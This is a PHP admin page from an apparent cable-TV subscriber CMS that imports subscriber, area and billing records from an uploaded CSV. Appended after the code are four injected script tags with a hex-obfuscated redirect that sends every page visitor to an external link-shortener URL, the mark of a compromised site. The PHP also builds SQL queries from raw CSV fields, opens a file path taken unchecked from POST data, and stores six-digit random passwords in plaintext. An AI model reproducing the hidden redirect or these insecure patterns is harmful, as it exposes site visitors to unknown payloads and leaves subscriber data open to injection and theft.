<?php
require_once("helper.php");
$msg    =  isset($_GET['msg']) ? $_GET['msg'] : '';
$id     = base64_decode($_GET['id']);
class myCms extends Cms 
{
    function registerAjaxFunctions()
    {
        $this->xajax->registerFunction("get_Listing");
        $this->xajax->registerFunction("update_status");
        $this->xajax->registerFunction("deleteRow");
        $this->xajax->registerFunction("editMode");
        $this->xajax->registerFunction("sorting");
        $this->xajax->registerFunction("sortTitle");
    }
}
$objMisc = new myCms();
$objMisc->initializeAjax(false,true);
$objMisc->dbFunc->parameters ="&sortOrder=".$sortOrder."&sortBy=".$sortBy ;
$objMisc->rec_pp = 20;
$objMisc->dbFunc->ajax_pagin = true;
if($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['submit'])){
    if(!empty($_POST['attachment'])){
        $fileName="uploads/".$_POST['attachment'];
        if (!$fp = fopen($fileName,"r")){
            echo "Sorry, cannot open the file";
        }else{ 
            //echo 'hello';exit;      
            while(!feof($fp)) {
                while (($data = fgetcsv($fp, 10000, ",")) !== FALSE) { 
                        //print_r($data); exit;
                         $fileRow++;    
                        $num = count($data);
                        if ($fileRow <= "1") continue;      // Continue Back Bcz its blank row in the CSV File 
                        
                        //Code For Area
                            //print_r($data);exit;
                        //echo " HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND `NAME`='$data[1]'";
                            $area=$objMisc->GiveValue(" HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND `NAME`='$data[1]'",'WING_ID','wing_master');
                            if($area=='' && ($data[1]!='' || $data[1]!=0)){
                                $areaArray = array( 'HEADOFFICE_ID'           =>$_SESSION['HEADOFFICE'],
                                                    'NAME'              =>addslashes($data[1]),
                                                    'ADDED_BY'          =>$_SESSION['USER_ID'],
                                                    'ADDED_TIME'        =>date('Y-m-d H:i:s'),
                                                    );
                                $insertLang=$objMisc->insert('wing_master',$areaArray);
                                $area=mysqli_insert_id($_SESSION['CONN']);
                            }
                        //Code For Sub Area

                            $subArea=$objMisc->GiveValue(" HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND WING_ID='$area' AND NAME='$data[2]'",'UNIT_ID','unit_master');
                            if($subArea=='' && ($data[2]!='' || $data[2]!=0)){
                                $subAreaArray = array( 'HEADOFFICE_ID'        =>$_SESSION['HEADOFFICE'],
                                                    'NAME'              =>addslashes($data[2]),
                                                    'WING_ID'           =>$area,
                                                    'DESCRIPTION'   =>'',
                                                    'ADDED_BY'          =>$_SESSION['USER_ID'],
                                                    'ADDED_TIME'        =>date('Y-m-d H:i:s'),
                                                    );
                                $insertSubarea=$objMisc->insert('unit_master',$subAreaArray);
                                $subArea=mysqli_insert_id($_SESSION['CONN']);
                            }

                        
                            $uniCustId=$data[7];
                            $subscriber=$objMisc->GiveValue(" HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND NAME='$data[3]' AND MSO_ID='$data[6]' AND CUSTOMER_ID='$uniCustId'",'SUBSCRIBER_ID','subscribers');
                            if(empty($subscriber)){
                                $subscriberArray = array(
                                                        'SERIAL_NO'        =>addslashes($data[0]),
                                                        'FRANCHISE_ID'        =>$_POST['franchise_id'],
                                                        'HEADOFFICE_ID'    =>$_SESSION['HEADOFFICE'],
                                                        'NAME'             =>addslashes($data[3]),
                                                        'DOB'             =>$objMisc->changeDateFormat($data[4]),
                                                        'PAYMENT_METHOD'   =>'P',
                                                        'ADDRESS'          =>addslashes($data[5]),
                                                        'CONNECTION_DATE'  =>$objMisc->changeDateFormat($data[17]),
                                                        'OPENING_BALANCE'  =>addslashes($data[18]),
                                                        'AMOUNT'           =>addslashes($data[18]),
                                                        'UNIT_ID'          =>$subArea,
                                                        'CUSTOMER_ID'      =>addslashes($uniCustId),
                                                        'PHONE_NO'         =>addslashes($data[8]),
                                                        'MOBILE_NO'        =>addslashes($data[9]),
                                                        'EMAIL'            =>addslashes($data[10]),
                                                        'ID_TYPE'          =>addslashes($data[11]),
                                                        'ID_NO'            =>addslashes($data[12]),
                                                        'IDENTITY_NAME'    =>addslashes($data[13]),
                                                        'INSTALLED_BY'     =>addslashes($data[14]),
                                                        'RELATION'         =>addslashes((($data[15]=='')?'S/o':$data[15])),
                                                        'RELATIVE'         =>addslashes($data[16]),
                                                        'REMARKS'          =>addslashes($data[19]),
                                                        'MSO_ID'           =>addslashes($data[6]),
                                                        'STATUS'           =>(($data[20]=='D')?'D':'A'),
                                                        'ADDED_BY'         =>$_SESSION['USER_ID'],
                                                        'ADDED_TIME'       =>date('Y-m-d H:i:s'),
                                                            );
                                //print_r($subscriberArray);
                                $insertSubscribers=$objMisc->insert('subscribers',$subscriberArray);
                                $subscriber=mysqli_insert_id($_SESSION['CONN']);
                                $sno=$objMisc->GiveValue(" HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND AMOUUNT_TYPE='D'",'MAX(SNO)','monthly_charges')+1;
                                if(!empty($data[18]) && $data[18]!=0){
                                    $openingBalanceArray=array(
                                        'HEADOFFICE_ID'     =>$_SESSION['HEADOFFICE'],
                                        'SUBSCRIBER_ID'     =>$subscriber,
                                        'RECEIPT_NO'        =>'Opening Balance',
                                        'AMOUNT_TYPE'       =>(($data[18]>0)?'D':'C'),
                                        'SNO'           =>$sno,
                                        'ADDED_BY'        =>$_SESSION['USER_ID'],
                                        'ADDED_TIME'       =>date('Y-m-d H:i:s'),
                                        'MONTH_DATE'       =>date('Y-m-d'),
                                        'AMOUNT'            =>abs($data[18]));
                                    $insOpeningBal=$objMisc->insert('monthly_charges',$openingBalanceArray);

                                }
                                $userId=$objMisc->GiveValue("`ID`='$subscriber' AND USER_TYPE='S'",'USER_ID','users');
                                if(!empty($data[8]) && empty($userId)){
                                    $userArray=array('HEADOFFICE_ID'    =>$_SESSION['HEADOFFICE'],
                                                     'USERNAME'         =>$data[8],
                                                     'USER_TYPE'        =>'S',
                                                     'ID'               =>$subscriber,
                                                     'PASSWORD'         =>rand(111111,999999),
                                                     'ADDED_BY'        =>$_SESSION['USER_ID']);
                                    $insertAsUser=$objMisc->insert('users',$userArray);
                                }else{
                                    if(!empty($data[7]) && empty($userId)){
                                        $userArray=array('HEADOFFICE_ID'    =>$_SESSION['HEADOFFICE'],
                                                         'USERNAME'         =>$data[7],
                                                         'USER_TYPE'        =>'S',
                                                         'ID'               =>$subscriber,
                                                         'PASSWORD'         =>rand(111111,999999),
                                                         'ADDED_BY'        =>$_SESSION['USER_ID']);
                                        $insertAsUser=$objMisc->insert('users',$userArray);
                                    }
                                }
                            }else{
                                $amount1=$objMisc->GiveValue(" HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND SUBSCRIBER_ID='$subscriber'",'AMOUNT','subscribers');
                                $amount=$amount+$amount1;
                                $where=" HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND SUBSCRIBER_ID='$subscriber'";
                                $Array1=array('AMOUNT' =>$amount);
                                $update=$objMisc->update('subscribers',$Array1,$where);
                            }
                    }
            }
            $_SESSION['msg']=1;
            header("LOCATION:import-subscribers-otherway.php");
            exit;
        } 
    }else{
        $_SESSION['msg']=2;
        header("LOCATION:import-subscribers-otherway.php");
        exit;
    }
}
$msg = isset($_SESSION['msg']) ? $_SESSION['msg'] : $msg;
unset($_SESSION['msg']);

switch ($msg)
{
    case 1:
        $msg = "Data imported successfully.";
    break;
    case 2:
        $msg = "";
        $errormsg = "Please try again later! Problem during completing this task.";
    break;
    case 3:
        $msg = "";
        $errormsg = "New Password And Confirm password should be same.";
    break;
}
$franchiseArray    =   $objMisc->myFunc->fnWriteOptionList($rowArray['franchise_id'],'NAME,FRANCHISE_ID','franchise_master'," 1 = 1 AND HEADOFFICE_ID='$_SESSION[HEADOFFICE]'",0,0,0);  
//echo 'test';exit;
$smartyVars['franchiseArray']            =   $franchiseArray;
$smartyVars['group']        =   $id;
$smartyVars['errormsg']     =   $errormsg;
$smartyVars['add']          =   $add;
$smartyVars['resRow']       =   $rowArray;
$smartyVars['pageheading']  =   $pageheading;
$smartyVars['classData']    =   $pagin_recs;
$smartyVars['msg']          =   $msg;
$smartyVars['page']         =   $_REQUEST['page'];
$objMisc->displayPage("header,import-subscribers-otherway,footer",$smartyVars);  
?>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>